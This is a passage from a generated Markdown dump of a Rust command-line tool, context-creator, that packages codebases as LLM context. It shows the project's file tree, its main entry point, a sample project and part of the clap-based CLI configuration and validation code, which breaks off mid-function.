# Code Context: .

## Statistics

- Total files: 129
- Total size: 985.31 KB bytes

### Files by type:
- Rust: 103
- Markdown: 14
- TOML: 6
- Text: 2
- JavaScript: 2
- Python: 1
- JSON: 1


## File Structure

```
.
â”œâ”€â”€ benches/
â”‚   â””â”€â”€ benchmarks.rs
â”œâ”€â”€ docs/
â”‚   â”œâ”€â”€ configuration.md
â”‚   â”œâ”€â”€ troubleshooting.md
â”‚   â”œâ”€â”€ architecture.md
â”‚   â”œâ”€â”€ README.md
â”‚   â”œâ”€â”€ api.md
â”‚   â”œâ”€â”€ usage.md
â”‚   â”œâ”€â”€ installation.md
â”‚   â””â”€â”€ examples.md
â”œâ”€â”€ examples/
â”‚   â”œâ”€â”€ config-examples/
â”‚   â”‚   â”œâ”€â”€ comprehensive.toml
â”‚   â”‚   â””â”€â”€ minimal.toml
â”‚   â”œâ”€â”€ sample-mixed-project/
â”‚   â”‚   â”œâ”€â”€ docs/
â”‚   â”‚   â”‚   â””â”€â”€ README.md
â”‚   â”‚   â”œâ”€â”€ src/
â”‚   â”‚   â”‚   â”œâ”€â”€ index.js
â”‚   â”‚   â”‚   â””â”€â”€ utils.py
â”‚   â”‚   â”œâ”€â”€ tests/
â”‚   â”‚   â”‚   â””â”€â”€ test_api.js
â”‚   â”‚   â””â”€â”€ package.json
â”‚   â”œâ”€â”€ sample-rust-project/
â”‚   â”‚   â”œâ”€â”€ src/
â”‚   â”‚   â”‚   â”œâ”€â”€ lib.rs
â”‚   â”‚   â”‚   â””â”€â”€ main.rs
â”‚   â”‚   â””â”€â”€ Cargo.toml
â”‚   â””â”€â”€ README.md
â”œâ”€â”€ src/
â”‚   â”œâ”€â”€ core/
â”‚   â”‚   â”œâ”€â”€ semantic/
â”‚   â”‚   â”‚   â”œâ”€â”€ languages/
â”‚   â”‚   â”‚   â”‚   â”œâ”€â”€ lua.rs
â”‚   â”‚   â”‚   â”‚   â”œâ”€â”€ javascript.rs
â”‚   â”‚   â”‚   â”‚   â”œâ”€â”€ dart.rs
â”‚   â”‚   â”‚   â”‚   â”œâ”€â”€ csharp.rs
â”‚   â”‚   â”‚   â”‚   â”œâ”€â”€ typescript.rs
â”‚   â”‚   â”‚   â”‚   â”œâ”€â”€ python.rs
â”‚   â”‚   â”‚   â”‚   â”œâ”€â”€ cpp.rs
â”‚   â”‚   â”‚   â”‚   â”œâ”€â”€ elixir.rs
â”‚   â”‚   â”‚   â”‚   â”œâ”€â”€ kotlin.rs
â”‚   â”‚   â”‚   â”‚   â”œâ”€â”€ rust.rs
â”‚   â”‚   â”‚   â”‚   â”œâ”€â”€ c.rs
â”‚   â”‚   â”‚   â”‚   â”œâ”€â”€ java.rs
â”‚   â”‚   â”‚   â”‚   â”œâ”€â”€ mod.rs
â”‚   â”‚   â”‚   â”‚   â”œâ”€â”€ php.rs
â”‚   â”‚   â”‚   â”‚   â”œâ”€â”€ swift.rs
â”‚   â”‚   â”‚   â”‚   â”œâ”€â”€ julia.rs
â”‚   â”‚   â”‚   â”‚   â”œâ”€â”€ r.rs
â”‚   â”‚   â”‚   â”‚   â”œâ”€â”€ elm.rs
â”‚   â”‚   â”‚   â”‚   â”œâ”€â”€ go.rs
â”‚   â”‚   â”‚   â”‚   â”œâ”€â”€ scala.rs
â”‚   â”‚   â”‚   â”‚   â””â”€â”€ ruby.rs
â”‚   â”‚   â”‚   â”œâ”€â”€ path_validator.rs
â”‚   â”‚   â”‚   â”œâ”€â”€ resolver.rs
â”‚   â”‚   â”‚   â”œâ”€â”€ query_engine.rs
â”‚   â”‚   â”‚   â”œâ”€â”€ mod.rs
â”‚   â”‚   â”‚   â”œâ”€â”€ analyzer.rs
â”‚   â”‚   â”‚   â”œâ”€â”€ python_test.rs
â”‚   â”‚   â”‚   â”œâ”€â”€ parser_pool.rs
â”‚   â”‚   â”‚   â”œâ”€â”€ cache.rs
â”‚   â”‚   â”‚   â”œâ”€â”€ javascript_test.rs
â”‚   â”‚   â”‚   â”œâ”€â”€ rust_function_call_test.rs
â”‚   â”‚   â”‚   â””â”€â”€ test.rs
â”‚   â”‚   â”œâ”€â”€ cache.rs
â”‚   â”‚   â”œâ”€â”€ token.rs
â”‚   â”‚   â”œâ”€â”€ mod.rs
â”‚   â”‚   â”œâ”€â”€ walker.rs
â”‚   â”‚   â”œâ”€â”€ semantic_graph.rs
â”‚   â”‚   â”œâ”€â”€ prioritizer.rs
â”‚   â”‚   â”œâ”€â”€ file_expander.rs
â”‚   â”‚   â””â”€â”€ context_builder.rs
â”‚   â”œâ”€â”€ utils/
â”‚   â”‚   â”œâ”€â”€ file_ext.rs
â”‚   â”‚   â”œâ”€â”€ error.rs
â”‚   â”‚   â””â”€â”€ mod.rs
â”‚   â”œâ”€â”€ lib.rs
â”‚   â”œâ”€â”€ main.rs
â”‚   â”œâ”€â”€ config.rs
â”‚   â”œâ”€â”€ cli.rs
â”‚   â””â”€â”€ remote.rs
â”œâ”€â”€ test_no_git/
â”‚   â”œâ”€â”€ test_no_git_dir/
â”‚   â”‚   â”œâ”€â”€ models/
â”‚   â”‚   â”‚   â”œâ”€â”€ mod.rs
â”‚   â”‚   â”‚   â””â”€â”€ user.rs
â”‚   â”‚   â”œâ”€â”€ handler.rs
â”‚   â”‚   â”œâ”€â”€ main.rs
â”‚   â”‚   â””â”€â”€ Cargo.toml
â”‚   â””â”€â”€ main.rs
â”œâ”€â”€ test_no_git_no_markers/
â”‚   â””â”€â”€ test.rs
â”œâ”€â”€ test_project/
â”‚   â”œâ”€â”€ shared/
â”‚   â”‚   â””â”€â”€ types/
â”‚   â”‚       â””â”€â”€ mod.rs
â”‚   â””â”€â”€ src/
â”‚       â”œâ”€â”€ handlers/
â”‚       â”‚   â””â”€â”€ user_handler.rs
â”‚       â””â”€â”€ models/
â”‚           â”œâ”€â”€ mod.rs
â”‚           â””â”€â”€ user.rs
â”œâ”€â”€ test_semantic/
â”‚   â”œâ”€â”€ lib.rs
â”‚   â”œâ”€â”€ main.rs
â”‚   â””â”€â”€ utils.rs
â”œâ”€â”€ tests/
â”‚   â”œâ”€â”€ semantic_analysis_test.rs
â”‚   â”œâ”€â”€ config_precedence_test.rs
â”‚   â”œâ”€â”€ cache_integration_test.rs
â”‚   â”œâ”€â”€ semantic_markdown_test.rs
â”‚   â”œâ”€â”€ debug_include_types_test.rs
â”‚   â”œâ”€â”€ e2e_test.rs
â”‚   â”œâ”€â”€ cli_uncovered_scenarios_test.rs
â”‚   â”œâ”€â”€ config_rename_test.rs
â”‚   â”œâ”€â”€ semantic_edge_cases_test.rs
â”‚   â”œâ”€â”€ cli_repo_paths_bug_test.rs
â”‚   â”œâ”€â”€ semantic_stress_test.rs
â”‚   â”œâ”€â”€ semantic_include_types_test.rs
â”‚   â”œâ”€â”€ module_rename_test.rs
â”‚   â”œâ”€â”€ glob_pattern_test.rs
â”‚   â”œâ”€â”€ prompt_token_reservation_test.rs
â”‚   â”œâ”€â”€ integration_test.rs
â”‚   â”œâ”€â”€ semantic_include_types_integration_test.rs
â”‚   â”œâ”€â”€ semantic_error_cases_test.rs
â”‚   â”œâ”€â”€ binary_name_test.rs
â”‚   â”œâ”€â”€ cli_test.rs
â”‚   â”œâ”€â”€ cli_combinations_test.rs
â”‚   â”œâ”€â”€ remote_parsing_test.rs
â”‚   â”œâ”€â”€ semantic_reliability_test.rs
â”‚   â”œâ”€â”€ performance_test.rs
â”‚   â”œâ”€â”€ security_vulnerability_test.rs
â”‚   â”œâ”€â”€ semantic_comprehensive_test.rs
â”‚   â”œâ”€â”€ token_limits_integration_test.rs
â”‚   â”œâ”€â”€ security_stress_test.rs
â”‚   â”œâ”€â”€ semantic_include_types_simple_test.rs
â”‚   â”œâ”€â”€ python_semantic_output_test.rs
â”‚   â”œâ”€â”€ ignore_patterns_test.rs
â”‚   â”œâ”€â”€ python_semantic_edge_cases_test.rs
â”‚   â”œâ”€â”€ semantic_output_test.rs
â”‚   â”œâ”€â”€ python_semantic_error_cases_test.rs
â”‚   â”œâ”€â”€ python_semantic_stress_test.rs
â”‚   â”œâ”€â”€ semantic_test_helpers.rs
â”‚   â””â”€â”€ cli_flexibility_test.rs
â”œâ”€â”€ CHANGELOG.md
â”œâ”€â”€ LICENSE
â”œâ”€â”€ README.md
â”œâ”€â”€ debug_simple.rs
â”œâ”€â”€ debug_include_types.rs
â”œâ”€â”€ CLAUDE.md
â”œâ”€â”€ CONTRIBUTING.md
â”œâ”€â”€ Makefile
â”œâ”€â”€ Cargo.toml
â””â”€â”€ clippy.toml
```

## Table of Contents

- [src/main.rs](#src-main-rs)
- [examples/sample-rust-project/src/main.rs](#examples-sample-rust-project-src-main-rs)
- [src/cli.rs](#src-cli-rs)
- [src/config.rs](#src-config-rs)
- [src/core/cache.rs](#src-core-cache-rs)
- [src/core/context_builder.rs](#src-core-context_builder-rs)
- [src/core/file_expander.rs](#src-core-file_expander-rs)
- [src/core/mod.rs](#src-core-mod-rs)
- [src/core/prioritizer.rs](#src-core-prioritizer-rs)
- [src/core/semantic/analyzer.rs](#src-core-semantic-analyzer-rs)
- [src/core/semantic/cache.rs](#src-core-semantic-cache-rs)
- [src/core/semantic/languages/c.rs](#src-core-semantic-languages-c-rs)
- [src/core/semantic/languages/cpp.rs](#src-core-semantic-languages-cpp-rs)
- [src/core/semantic/languages/csharp.rs](#src-core-semantic-languages-csharp-rs)
- [src/core/semantic/languages/dart.rs](#src-core-semantic-languages-dart-rs)
- [src/core/semantic/languages/elixir.rs](#src-core-semantic-languages-elixir-rs)
- [src/core/semantic/languages/elm.rs](#src-core-semantic-languages-elm-rs)
- [src/core/semantic/languages/go.rs](#src-core-semantic-languages-go-rs)
- [src/core/semantic/languages/java.rs](#src-core-semantic-languages-java-rs)
- [src/core/semantic/languages/javascript.rs](#src-core-semantic-languages-javascript-rs)
- [src/core/semantic/languages/julia.rs](#src-core-semantic-languages-julia-rs)
- [src/core/semantic/languages/kotlin.rs](#src-core-semantic-languages-kotlin-rs)
- [src/core/semantic/languages/lua.rs](#src-core-semantic-languages-lua-rs)
- [src/core/semantic/languages/mod.rs](#src-core-semantic-languages-mod-rs)
- [src/core/semantic/languages/php.rs](#src-core-semantic-languages-php-rs)
- [src/core/semantic/languages/python.rs](#src-core-semantic-languages-python-rs)
- [src/core/semantic/languages/r.rs](#src-core-semantic-languages-r-rs)
- [src/core/semantic/languages/ruby.rs](#src-core-semantic-languages-ruby-rs)
- [src/core/semantic/languages/rust.rs](#src-core-semantic-languages-rust-rs)
- [src/core/semantic/languages/scala.rs](#src-core-semantic-languages-scala-rs)
- [src/core/semantic/languages/swift.rs](#src-core-semantic-languages-swift-rs)
- [src/core/semantic/languages/typescript.rs](#src-core-semantic-languages-typescript-rs)
- [src/core/semantic/mod.rs](#src-core-semantic-mod-rs)
- [src/core/semantic/parser_pool.rs](#src-core-semantic-parser_pool-rs)
- [src/core/semantic/path_validator.rs](#src-core-semantic-path_validator-rs)
- [src/core/semantic/query_engine.rs](#src-core-semantic-query_engine-rs)
- [src/core/semantic/resolver.rs](#src-core-semantic-resolver-rs)
- [src/core/semantic_graph.rs](#src-core-semantic_graph-rs)
- [src/core/token.rs](#src-core-token-rs)
- [src/core/walker.rs](#src-core-walker-rs)
- [src/lib.rs](#src-lib-rs)
- [src/remote.rs](#src-remote-rs)
- [src/utils/error.rs](#src-utils-error-rs)
- [src/utils/file_ext.rs](#src-utils-file_ext-rs)
- [src/utils/mod.rs](#src-utils-mod-rs)
- [test_no_git/main.rs](#test_no_git-main-rs)
- [test_no_git/test_no_git_dir/main.rs](#test_no_git-test_no_git_dir-main-rs)
- [test_semantic/main.rs](#test_semantic-main-rs)
- [examples/sample-mixed-project/src/index.js](#examples-sample-mixed-project-src-index-js)
- [benches/benchmarks.rs](#benches-benchmarks-rs)
- [debug_include_types.rs](#debug_include_types-rs)
- [debug_simple.rs](#debug_simple-rs)
- [src/core/semantic/javascript_test.rs](#src-core-semantic-javascript_test-rs)
- [src/core/semantic/python_test.rs](#src-core-semantic-python_test-rs)
- [src/core/semantic/rust_function_call_test.rs](#src-core-semantic-rust_function_call_test-rs)
- [src/core/semantic/test.rs](#src-core-semantic-test-rs)
- [test_project/src/handlers/user_handler.rs](#test_project-src-handlers-user_handler-rs)
- [test_project/src/models/mod.rs](#test_project-src-models-mod-rs)
- [test_project/src/models/user.rs](#test_project-src-models-user-rs)
- [test_semantic/lib.rs](#test_semantic-lib-rs)
- [examples/sample-rust-project/src/lib.rs](#examples-sample-rust-project-src-lib-rs)
- [test_no_git/test_no_git_dir/handler.rs](#test_no_git-test_no_git_dir-handler-rs)
- [test_no_git/test_no_git_dir/models/mod.rs](#test_no_git-test_no_git_dir-models-mod-rs)
- [test_no_git/test_no_git_dir/models/user.rs](#test_no_git-test_no_git_dir-models-user-rs)
- [test_no_git_no_markers/test.rs](#test_no_git_no_markers-test-rs)
- [test_project/shared/types/mod.rs](#test_project-shared-types-mod-rs)
- [test_semantic/utils.rs](#test_semantic-utils-rs)
- [tests/binary_name_test.rs](#tests-binary_name_test-rs)
- [tests/cache_integration_test.rs](#tests-cache_integration_test-rs)
- [tests/cli_combinations_test.rs](#tests-cli_combinations_test-rs)
- [tests/cli_flexibility_test.rs](#tests-cli_flexibility_test-rs)
- [tests/cli_repo_paths_bug_test.rs](#tests-cli_repo_paths_bug_test-rs)
- [tests/cli_test.rs](#tests-cli_test-rs)
- [tests/cli_uncovered_scenarios_test.rs](#tests-cli_uncovered_scenarios_test-rs)
- [tests/config_precedence_test.rs](#tests-config_precedence_test-rs)
- [tests/config_rename_test.rs](#tests-config_rename_test-rs)
- [tests/debug_include_types_test.rs](#tests-debug_include_types_test-rs)
- [tests/e2e_test.rs](#tests-e2e_test-rs)
- [tests/glob_pattern_test.rs](#tests-glob_pattern_test-rs)
- [tests/ignore_patterns_test.rs](#tests-ignore_patterns_test-rs)
- [tests/integration_test.rs](#tests-integration_test-rs)
- [tests/module_rename_test.rs](#tests-module_rename_test-rs)
- [tests/performance_test.rs](#tests-performance_test-rs)
- [tests/prompt_token_reservation_test.rs](#tests-prompt_token_reservation_test-rs)
- [tests/python_semantic_edge_cases_test.rs](#tests-python_semantic_edge_cases_test-rs)
- [tests/python_semantic_error_cases_test.rs](#tests-python_semantic_error_cases_test-rs)
- [tests/python_semantic_output_test.rs](#tests-python_semantic_output_test-rs)
- [tests/python_semantic_stress_test.rs](#tests-python_semantic_stress_test-rs)
- [tests/remote_parsing_test.rs](#tests-remote_parsing_test-rs)
- [tests/security_stress_test.rs](#tests-security_stress_test-rs)
- [tests/security_vulnerability_test.rs](#tests-security_vulnerability_test-rs)
- [tests/semantic_analysis_test.rs](#tests-semantic_analysis_test-rs)
- [tests/semantic_comprehensive_test.rs](#tests-semantic_comprehensive_test-rs)
- [tests/semantic_edge_cases_test.rs](#tests-semantic_edge_cases_test-rs)
- [tests/semantic_error_cases_test.rs](#tests-semantic_error_cases_test-rs)
- [tests/semantic_include_types_integration_test.rs](#tests-semantic_include_types_integration_test-rs)
- [tests/semantic_include_types_simple_test.rs](#tests-semantic_include_types_simple_test-rs)
- [tests/semantic_include_types_test.rs](#tests-semantic_include_types_test-rs)
- [tests/semantic_markdown_test.rs](#tests-semantic_markdown_test-rs)
- [tests/semantic_output_test.rs](#tests-semantic_output_test-rs)
- [tests/semantic_reliability_test.rs](#tests-semantic_reliability_test-rs)
- [tests/semantic_stress_test.rs](#tests-semantic_stress_test-rs)
- [tests/semantic_test_helpers.rs](#tests-semantic_test_helpers-rs)
- [tests/token_limits_integration_test.rs](#tests-token_limits_integration_test-rs)
- [examples/sample-mixed-project/src/utils.py](#examples-sample-mixed-project-src-utils-py)
- [Cargo.toml](#cargo-toml)
- [clippy.toml](#clippy-toml)
- [CHANGELOG.md](#changelog-md)
- [CLAUDE.md](#claude-md)
- [CONTRIBUTING.md](#contributing-md)
- [README.md](#readme-md)
- [docs/README.md](#docs-readme-md)
- [docs/api.md](#docs-api-md)
- [docs/architecture.md](#docs-architecture-md)
- [docs/configuration.md](#docs-configuration-md)
- [docs/installation.md](#docs-installation-md)
- [docs/troubleshooting.md](#docs-troubleshooting-md)
- [docs/usage.md](#docs-usage-md)
- [examples/sample-mixed-project/tests/test_api.js](#examples-sample-mixed-project-tests-test_api-js)
- [docs/examples.md](#docs-examples-md)
- [examples/README.md](#examples-readme-md)
- [examples/sample-mixed-project/docs/README.md](#examples-sample-mixed-project-docs-readme-md)
- [test_no_git/test_no_git_dir/Cargo.toml](#test_no_git-test_no_git_dir-cargo-toml)
- [examples/config-examples/comprehensive.toml](#examples-config-examples-comprehensive-toml)
- [examples/config-examples/minimal.toml](#examples-config-examples-minimal-toml)
- [examples/sample-mixed-project/package.json](#examples-sample-mixed-project-package-json)
- [examples/sample-rust-project/Cargo.toml](#examples-sample-rust-project-cargo-toml)
- [LICENSE](#license)
- [Makefile](#makefile)

## src/main.rs

Imports: anyhow::Result, clap::Parser, context_creator, std::io::Read

Type references: clap::Parser.Parser, std::io::Read.Read

```rust
use anyhow::Result;
use clap::Parser;
use context_creator::{cli::Config, run};

fn main() -> Result<()> {
    // Parse command line arguments
    let mut config = Config::parse();

    // Load configuration from file if specified
    config.load_from_file()?;

    // Read prompt from stdin if needed
    if config.should_read_stdin() {
        use std::io::Read;
        let mut buffer = String::new();
        std::io::stdin().read_to_string(&mut buffer)?;

        // Set the prompt from stdin if not already set
        if config.prompt.is_none() {
            config.prompt = Some(buffer.trim().to_string());
        }
    }

    // Run the application
    run(config)?;

    Ok(())
}
```

## examples/sample-rust-project/src/main.rs

Imports: serde, tests, super::*, user, user, error

Type references: User, ApiResponse, T, T, T, Error, User, ApiResponse, User

```rust
//! Sample Rust project for testing context-creator

use serde::{Deserialize, Serialize};

#[derive(Debug, Serialize, Deserialize)]
struct User {
    id: u64,
    name: String,
    email: String,
}

#[derive(Debug, Serialize, Deserialize)]
struct ApiResponse<T> {
    data: T,
    status: String,
}

/// Main entry point
#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    println!("Sample Rust Project");
    
    // Example user
    let user = User {
        id: 1,
        name: "Alice".to_string(),
        email: "alice@example.com".to_string(),
    };
    
    // Simulate API response
    let response = ApiResponse {
        data: user,
        status: "success".to_string(),
    };
    
    // Serialize to JSON
    let json = serde_json::to_string_pretty(&response)?;
    println!("Response: {}", json);
    
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    
    #[test]
    fn test_user_creation() {
        let user = User {
            id: 1,
            name: "Test".to_string(),
            email: "test@example.com".to_string(),
        };
        
        assert_eq!(user.id, 1);
        assert_eq!(user.name, "Test");
    }
}
```

## src/cli.rs

Imports: clap, std::path::PathBuf, crate::utils::error::ContextCreatorError, crate::config::ConfigFile, std::io::IsTerminal, tests, super::*, std::fs, tempfile::TempDir, crate::config::TokenLimits, clap::Parser, config

Type references: std::path::PathBuf.PathBuf, LlmTool, LlmTool, crate::config::TokenLimits.TokenLimits, Config, std::path::PathBuf.PathBuf, std::path::PathBuf.PathBuf, LlmTool, LlmTool, std::path::PathBuf.PathBuf, Priority, crate::config::TokenLimits.TokenLimits, Default, Config, Self, Self, Self, Config, crate::utils::error::ContextCreatorError.ContextCreatorError, crate::utils::error::ContextCreatorError.ContextCreatorError, crate::utils::error::ContextCreatorError.ContextCreatorError, crate::config::ConfigFile.ConfigFile, std::path::PathBuf.PathBuf, std::io::IsTerminal.IsTerminal, fs, tempfile::TempDir.TempDir, Config, std::path::PathBuf.PathBuf, Self, Self, Self, Self, Self, Self, Config, Config, Config, Config, Config, Config, Config, Config, crate::config::TokenLimits.TokenLimits, Config, crate::config::TokenLimits.TokenLimits, crate::config::TokenLimits.TokenLimits, Config, crate::config::TokenLimits.TokenLimits, crate::config::TokenLimits.TokenLimits, Config, crate::config::TokenLimits.TokenLimits, crate::config::TokenLimits.TokenLimits, Config, crate::config::TokenLimits.TokenLimits, crate::config::TokenLimits.TokenLimits, Config, crate::config::TokenLimits.TokenLimits, crate::config::TokenLimits.TokenLimits, Config, crate::config::TokenLimits.TokenLimits, crate::config::TokenLimits.TokenLimits, crate::config::TokenLimits.TokenLimits, crate::config::TokenLimits.TokenLimits, crate::config::TokenLimits.TokenLimits, Config, Config, Config, crate::config::TokenLimits.TokenLimits, Config, crate::config::TokenLimits.TokenLimits, Config, Config, clap::Parser.Parser, clap::Parser.Parser, Config, Config, Config

```rust
//! Command-line interface configuration and parsing

use clap::{Parser, ValueEnum};
use std::path::PathBuf;

/// Help message explaining custom priority rules and usage
const AFTER_HELP_MSG: &str = "\
CUSTOM PRIORITY RULES:
  Custom priority rules are processed in a 'first-match-wins' basis. Rules are 
  evaluated in the order they are defined in your .context-creator.toml configuration 
  file. The first rule that matches a given file will be used, and all subsequent 
  rules will be ignored for that file.

  Example configuration:
    [[priorities]]
    pattern = \"src/**/*.rs\"
    weight = 10.0
    
    [[priorities]]  
    pattern = \"tests/*\"
    weight = -2.0

USAGE EXAMPLES:
  # Process current directory with a prompt
  context-creator --prompt \"Analyze this code\"
  
  # Process specific directories (positional arguments)
  context-creator src/ tests/ docs/
  
  # Process specific directories (explicit include flags)
  context-creator --include src/ --include tests/ --include docs/
  
  # Process files matching glob patterns (QUOTE patterns to prevent shell expansion)
  context-creator --include \"**/*.py\" --include \"src/**/*.{rs,toml}\"
  
  # Process specific file types across all directories
  context-creator --include \"**/*repository*.py\" --include \"**/test[0-9].py\"
  
  # Combine prompt with include patterns for targeted analysis
  context-creator --prompt \"Review security\" --include \"src/auth/**\" --include \"src/security/**\"
  
  # Use ignore patterns to exclude unwanted files
  context-creator --include \"**/*.rs\" --ignore \"target/**\" --ignore \"**/*_test.rs\"
  
  # Combine prompt with ignore patterns
  context-creator --prompt \"Analyze core logic\" --ignore \"tests/**\" --ignore \"docs/**\"
  
  # Process a GitHub repository
  context-creator --repo https://github.com/owner/repo
  
  # Read prompt from stdin
  echo \"Review this code\" | context-creator --stdin .
  
  # FLEXIBLE COMBINATIONS (NEW):
  # Combine prompt with specific directories
  context-creator --prompt \"Security audit\" src/auth/ src/security/
  
  # Combine prompt with GitHub repository
  context-creator --prompt \"Find bugs\" --repo https://github.com/owner/repo
  
  # Combine stdin with specific directories
  echo \"Analyze patterns\" | context-creator --stdin src/ tests/
  
  # Combine include patterns with GitHub repository
  context-creator --include \"**/*.rs\" --repo https://github.com/owner/repo
  
  # Combine stdin with include patterns
  echo \"Review code\" | context-creator --stdin --include \"**/*.py\"
";

/// Supported LLM CLI tools
#[derive(Debug, Clone, Copy, PartialEq, Eq, ValueEnum, Default)]
pub enum LlmTool {
    /// Use gemini (default)
    #[value(name = "gemini")]
    #[default]
    Gemini,
    /// Use codex CLI
    #[value(name = "codex")]
    Codex,
}

impl LlmTool {
    /// Get the command name for the tool
    pub fn command(&self) -> &'static str {
        match self {
            LlmTool::Gemini => "gemini",
            LlmTool::Codex => "codex",
        }
    }

    /// Get the installation instructions for the tool
    pub fn install_instructions(&self) -> &'static str {
        match self {
            LlmTool::Gemini => "Please install gemini with: pip install gemini",
            LlmTool::Codex => {
                "Please install codex CLI from: https://github.com/microsoft/codex-cli"
            }
        }
    }

    /// Get the default maximum tokens for the tool
    pub fn default_max_tokens(&self) -> usize {
        match self {
            LlmTool::Gemini => 1_000_000,
            LlmTool::Codex => 1_000_000,
        }
    }

    /// Get the default maximum tokens for the tool with optional config override
    pub fn default_max_tokens_with_config(
        &self,
        config_token_limits: Option<&crate::config::TokenLimits>,
    ) -> usize {
        if let Some(token_limits) = config_token_limits {
            match self {
                LlmTool::Gemini => token_limits.gemini.unwrap_or(1_000_000),
                LlmTool::Codex => token_limits.codex.unwrap_or(1_000_000),
            }
        } else {
            self.default_max_tokens()
        }
    }
}

/// High-performance CLI tool to convert codebases to Markdown for LLM context
#[derive(Parser, Debug, Clone)]
#[command(author, version, about, long_about = None, after_help = AFTER_HELP_MSG)]
pub struct Config {
    /// The prompt to send to the LLM for processing
    #[arg(short = 'p', long = "prompt", help = "Process a text prompt directly")]
    pub prompt: Option<String>,

    /// One or more directory paths to process
    /// IMPORTANT: Use `get_directories()` to access the correct input paths.
    #[arg(value_name = "PATHS", help = "Process directories")]
    pub paths: Option<Vec<PathBuf>>,

    /// Include files and directories matching glob patterns
    /// IMPORTANT: Use `get_directories()` to access the correct input paths.
    #[arg(
        long,
        help = "Include files and directories matching the given glob pattern.\nPatterns use gitignore-style syntax. To prevent shell expansion,\nquote patterns: --include \"*.py\" --include \"src/**/*.{rs,toml}\""
    )]
    pub include: Option<Vec<String>>,

    /// Ignore files and directories matching glob patterns
    #[arg(
        long,
        help = "Ignore files and directories matching the given glob pattern.\nPatterns use gitignore-style syntax. To prevent shell expansion,\nquote patterns: --ignore \"node_modules/**\" --ignore \"target/**\""
    )]
    pub ignore: Option<Vec<String>>,

    /// GitHub repository URL to analyze (e.g., <https://github.com/owner/repo>)
    #[arg(long, help = "Process a GitHub repository")]
    pub repo: Option<String>,

    /// Read prompt from stdin
    #[arg(long = "stdin", help = "Read prompt from standard input")]
    pub read_stdin: bool,

    /// The path to the output Markdown file. If used, won't call the LLM CLI
    #[arg(short = 'o', long)]
    pub output_file: Option<PathBuf>,

    /// Maximum number of tokens for the generated codebase context
    #[arg(long)]
    pub max_tokens: Option<usize>,

    /// LLM CLI tool to use for processing
    #[arg(short = 't', long = "tool", default_value = "gemini")]
    pub llm_tool: LlmTool,

    /// Suppress all output except for errors and the final LLM response
    #[arg(short = 'q', long)]
    pub quiet: bool,

    /// Enable verbose logging
    #[arg(short = 'v', long)]
    pub verbose: bool,

    /// Path to configuration file
    #[arg(short = 'c', long)]
    pub config: Option<PathBuf>,

    /// Show progress indicators during processing
    #[arg(long)]
    pub progress: bool,

    /// Copy output to system clipboard instead of stdout
    #[arg(short = 'C', long)]
    pub copy: bool,

    /// Enable enhanced context with file metadata
    #[arg(long = "enhanced-context")]
    pub enhanced_context: bool,

    /// Enable import tracing for included files
    #[arg(long, help = "Include files that import the specified modules")]
    pub trace_imports: bool,

    /// Include files that call functions from specified modules
    #[arg(long, help = "Include files containing callers of specified functions")]
    pub include_callers: bool,

    /// Include type definitions used by specified files
    #[arg(long, help = "Include type definitions and interfaces")]
    pub include_types: bool,

    /// Maximum depth for semantic dependency traversal
    #[arg(
        long,
        default_value = "2",
        help = "Depth limit for dependency traversal"
    )]
    pub semantic_depth: usize,

    /// Custom priority rules loaded from config file (not a CLI argument)
    #[clap(skip)]
    pub custom_priorities: Vec<crate::config::Priority>,

    /// Token limits loaded from config file (not a CLI argument)
    #[clap(skip)]
    pub config_token_limits: Option<crate::config::TokenLimits>,

    /// Maximum tokens from config defaults (not a CLI argument)
    #[clap(skip)]
    pub config_defaults_max_tokens: Option<usize>,
}

impl Default for Config {
    fn default() -> Self {
        Self {
            prompt: None,
            paths: None,
            include: None,
            ignore: None,
            repo: None,
            read_stdin: false,
            output_file: None,
            max_tokens: None,
            llm_tool: LlmTool::default(),
            quiet: false,
            verbose: false,
            config: None,
            progress: false,
            copy: false,
            enhanced_context: false,
            trace_imports: false,
            include_callers: false,
            include_types: false,
            semantic_depth: 2,
            custom_priorities: vec![],
            config_token_limits: None,
            config_defaults_max_tokens: None,
        }
    }
}

impl Config {
    /// Validate the configuration
    pub fn validate(&self) -> Result<(), crate::utils::error::ContextCreatorError> {
        use crate::utils::error::ContextCreatorError;

        // Validate that at least one input source is provided
        let has_input_source = self.get_prompt().is_some()
            || self.paths.is_some()
            || self.include.is_some()
            || self.repo.is_some()
            || self.read_stdin;

        if !has_input_source {
            return Err(ContextCreatorError::InvalidConfiguration(
                "At least one input source must be provided: --prompt, paths, --include, --repo, or --stdin".to_string(),
            ));
        }

        // Note: Removed overly restrictive validation rules per issue #34
        // Now allowing flexible combinations like:
        // - --prompt with paths (--prompt "text" src/)
        // - --prompt with --repo (--prompt "text" --repo url)
        // - --stdin with paths (echo "prompt" | context-creator --stdin src/)
        // - --include with --repo (--include "**/*.rs" --repo url)
        // - --include with --stdin (--stdin --include "**/*.rs")
        //
        // The only remaining restrictions are for legitimate conflicts:
        // - --prompt with --output-file (can't send to LLM and write to file)
        // - --copy with --output-file (can't copy to clipboard and write to file)

        // Validate repo URL if provided
        if let Some(repo_url) = &self.repo {
            if !repo_url.starts_with("https://github.com/")
                && !repo_url.starts_with("http://github.com/")
            {
                return Err(ContextCreatorError::InvalidConfiguration(
                    "Repository URL must be a GitHub URL (https://github.com/owner/repo)"
                        .to_string(),
                ));
            }
        } else {
            // Only validate directories if repo is not provided
            let directories = self.get_directories();
            for directory in &directories {
                if !directory.exists() {
                    return Err(ContextCreatorError::InvalidPath(format!(
                        "Directory does not exist: {}",
                        directory.display()
                    )));
                }

                if !directory.is_dir() {
                    return Err(ContextCreatorError::InvalidPath(format!(
                        "Path is not a directory: {}",
                        directory.display()
                    )));
                }
            }
        }

        // Note: Pattern validation is handled by OverrideBuilder in walker.rs
        // which provides better security and ReDoS protection

        // Validate output file parent directory exists if specified
        if let Some(output) = &self.output_file {
            if let Some(parent) = output.parent() {
                // Handle empty parent (current directory) and check if parent exists
                if !parent.as_os_str().is_empty() && !parent.exists() {
                    return Err(ContextCreatorError::InvalidPath(format!(
                        "Output directory does not exist: {}",
                        parent.display()
                    )));
                }
            }
        }

        // Validate mutually exclusive options
        if self.output_file.is_some() && self.get_prompt().is_some() {
            return Err(ContextCreatorError::InvalidConfiguration(
                "Cannot specify both --output and a prompt".to_string(),
            ));
        }

        // Validate copy and output mutual exclusivity
        if self.copy && self.output_file.is_some() {
            return Err(ContextCreatorError::InvalidConfiguration(
                "Cannot specify both --copy and --output".to_string(),
            ));
        }

        // Validate repo and paths mutual exclusivity
        // When --repo is specified, any positional paths are silently ignored in run()
